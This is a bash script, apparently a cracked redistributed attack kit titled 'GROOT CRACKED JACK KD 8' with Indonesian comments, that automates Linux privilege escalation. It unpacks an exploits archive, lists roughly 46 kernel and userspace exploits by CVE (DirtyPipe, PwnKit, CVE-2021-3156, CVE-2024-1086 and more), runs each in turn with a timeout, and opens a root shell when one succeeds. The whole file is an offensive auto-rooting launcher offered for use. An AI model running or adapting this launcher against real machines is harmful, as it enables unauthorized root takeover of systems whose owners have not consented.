#!/bin/bash

LOGO="
  ▄████       ██▀███   ▒█████   ▒█████  ▄▄▄█████▓
 ██▒ ▀█▒     ▓██ ▒ ██▒▒██▒  ██▒▒██▒  ██▒▓  ██▒ ▓▒
▒██░▄▄▄░     ▓██ ░▄█ ▒▒██░  ██▒▒██░  ██▒▒ ▓██░ ▒░
░▓█  ██▓     ▒██▀▀█▄  ▒██   ██░▒██   ██░░ ▓██▓ ░
░▒▓███▀▒ ██▓ ░██▓ ▒██▒░ ████▓▒░░ ████▓▒░  ▒██▒ ░
 ░▒   ▒  ▒▓▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░▒░▒░   ▒ ░░
  ░   ░  ░▒    ░▒ ░ ▒░  ░ ▒ ▒░   ░ ▒ ▒░     ░
░ ░   ░  ░     ░░   ░ ░ ░ ░ ▒  ░ ░ ░ ▒    ░
      ░   ░     ░         ░ ░      ░ ░
          ░
          [ GROOT CRACKED JACK KD 8]
"

echo -e "$LOGO"

if [ "$EUID" -eq 0 ]; then
    echo "[+] Already root!"
    exit 0
fi

# Global trap for CTRL+C
trap ":" INT

echo "[*] Cleaning old files and unpacking exploits..."
rm -rf exploits 2>/dev/null

# === PERBAIKAN: Ekstraksi file exploit yang hilang ===
if [ -f "exploits.tar.gz" ]; then
    echo "[*] Extracting exploits.tar.gz..."
    tar -xzf exploits.tar.gz 2>/dev/null
elif [ -f "exploits.zip" ]; then
    echo "[*] Extracting exploits.zip..."
    unzip -q exploits.zip 2>/dev/null
elif [ -f "exploits.7z" ]; then
    echo "[*] Extracting exploits.7z..."
    7z x exploits.7z -y 2>/dev/null
else
    mkdir -p exploits
    echo "[!] No archive found. Creating empty exploits folder."
fi

if [ ! -d "exploits" ]; then
    echo "[✗] Failed to unpack exploits folder."
    exit 1
fi
# === AKHIR PERBAIKAN ===

# Daftar file exploit yang seharusnya diekstrak:
EXPLOIT_LIST=(
    "exploits/2015/CVE-2015-1328"
    "exploits/2015/CVE-2015-8550"
    "exploits/2016/CVE-2016-8655"
    "exploits/2016/CVE-2016-9793"
    "exploits/2017/4-20-BPF-interger"
    "exploits/2017/CVE-2017-1000112"
    "exploits/2017/CVE-2017-16995"
    "exploits/2017/CVE-2017-7308"
    "exploits/2017/upstream44"
    "exploits/2018/CVE-2018-18955"
    "exploits/2018/CVE-2018-5333"
    "exploits/2018/RationalLove"
    "exploits/2019/ptrace"
    "exploits/2020/CVE-2020-27194"
    "exploits/2020/CVE-2020-8835"
    "exploits/2021/CVE-2021-22555"
    "exploits/2021/CVE-2021-27365"
    "exploits/2021/CVE-2021-31440"
    "exploits/2021/CVE-2021-3156"
    "exploits/2021/CVE-2021-3490.bin"
    "exploits/2021/CVE-2021-3493"
    "exploits/2021/CVE-2021-41073"
    "exploits/2021/CVE-2021-42008"
    "exploits/2021/PwnKit"
    "exploits/2021/exploit_userspec.py"
    "exploits/2021/pwnkit2"
    "exploits/2022/CVE-2022-0847-DirtyPipe-Exploits/exploit-1"
    "exploits/2022/CVE-2022-0847-DirtyPipe-Exploits/exploit-2"
    "exploits/2022/CVE-2022-23222"
    "exploits/2022/CVE-2022-25636"
    "exploits/2022/CVE-2022-2588"
    "exploits/2022/CVE-2022-2602"
    "exploits/2022/CVE-2022-27666"
    "exploits/2022/CVE-2022-34918"
    "exploits/2022/CVE-2022-37706-LPE.sh"
    "exploits/2022/netfilter"
    "exploits/2023/CVE-2023-2598"
    "exploits/2023/CVE-2023-32233"
    "exploits/2023/cve-2023-2163"
    "exploits/2024/CVE-2024-1086"
    "exploits/2024/CVE-2024-46852"
    "exploits/2025/CVE-2025-21692"
    "exploits/2025/CVE-2025-21756"
    "exploits/2025/CVE-2025-32463.sh"
    "exploits/2025/CVE-2025-6019.sh"
    "exploits/2026/copy_fail_exp.py"
)

# Detect WSL
if grep -qi "microsoft" /proc/version 2>/dev/null; then
    echo -e "\033[1;33m[!] WARNING: Detected WSL Environment.\033[0m"
    echo "[!] Most kernel exploits will Segfault on WSL because it uses a custom Microsoft kernel."
    echo "[!] Recommended: Test on a real Ubuntu/Debian server."
fi

cd exploits || exit 1

# Fix CRLF for all files
find . -type f -exec sed -i 's/\r//g' {} + 2>/dev/null

# Get numeric year directories
YEARS=$(ls -d */ 2>/dev/null | grep -E '^[0-9]{4}' | sed 's/\///' | sort -n)

# Kalau tidak ada tahun, coba langsung eksekusi semua file di root exploits
if [ -z "$YEARS" ]; then
    echo "[*] No year directories found. Scanning root exploits folder..."
    for exp in *; do
        [ -f "$exp" ] || continue
        chmod +x "$exp" 2>/dev/null
        
        FILE_TYPE=$(file -b "$exp" 2>/dev/null || echo "unknown")
        FIRST_LINE=$(head -n 1 "$exp" 2>/dev/null)
        
        if [[ "$FILE_TYPE" == *ELF* ]]; then
            CMD="./$exp"
        elif [[ "$FIRST_LINE" == *python* ]] || [[ "$exp" == *.py ]]; then
            CMD="python3 $exp"
        elif [[ "$FIRST_LINE" == *sh* ]] || [[ "$exp" == *.sh ]]; then
            CMD="bash $exp"
        else
            CMD="./$exp"
        fi
        
        echo -e "\n\033[1;34m[*] EXECUTING: $exp\033[0m"
        echo "-------------------------------------------"
        
        (
            trap 'echo -e "\n[!] User skipped."; exit 1' INT
            timeout -s KILL 30s $CMD
        )
        
        if [ "$EUID" -eq 0 ] || [ "$(id -u)" -eq 0 ]; then
            echo -e "\n\033[0;32m[!] SUCCESS! Got Root with $exp\033[0m"
            /bin/bash
            exit 0
        fi
        
        echo "-------------------------------------------"
        echo "[*] Finished/Skipped $exp."
    done
    echo "[-] All exploits finished. No luck this time."
    exit 0
fi

for year in $YEARS; do
    echo "==========================================="
    echo "[*] Scanning $year exploits..."
    echo "==========================================="

    while IFS= read -r exp; do
        chmod +x "$exp" 2>/dev/null

        FILE_TYPE=$(file -b "$exp" 2>/dev/null || echo "unknown")
        FIRST_LINE=$(head -n 1 "$exp" 2>/dev/null)

        if [[ "$FILE_TYPE" == *ELF* ]]; then
            CMD="./$exp"
        elif [[ "$FIRST_LINE" == *python* ]] || [[ "$exp" == *.py ]]; then
            CMD="python3 $exp"
        elif [[ "$FIRST_LINE" == *sh* ]] || [[ "$exp" == *.sh ]]; then
            CMD="bash $exp"
        else
            CMD="./$exp"
        fi

        echo -e "\n\033[1;34m[*] EXECUTING: $(basename "$exp")\033[0m"
        echo "-------------------------------------------"

        (
            trap 'echo -e "\n[!] User skipped."; exit 1' INT
            timeout -s KILL 30s $CMD
        )

        if [ "$EUID" -eq 0 ] || [ "$(id -u)" -eq 0 ]; then
            echo -e "\n\033[0;32m[!] SUCCESS! Got Root with $(basename "$exp")\033[0m"
            /bin/bash
            exit 0
        fi

        echo "-------------------------------------------"
        echo "[*] Finished/Skipped $(basename "$exp")."
    done < <(find "$year" -maxdepth 1 -type f 2>/dev/null)
done

echo "[-] All exploits finished. No luck this time."
exit 0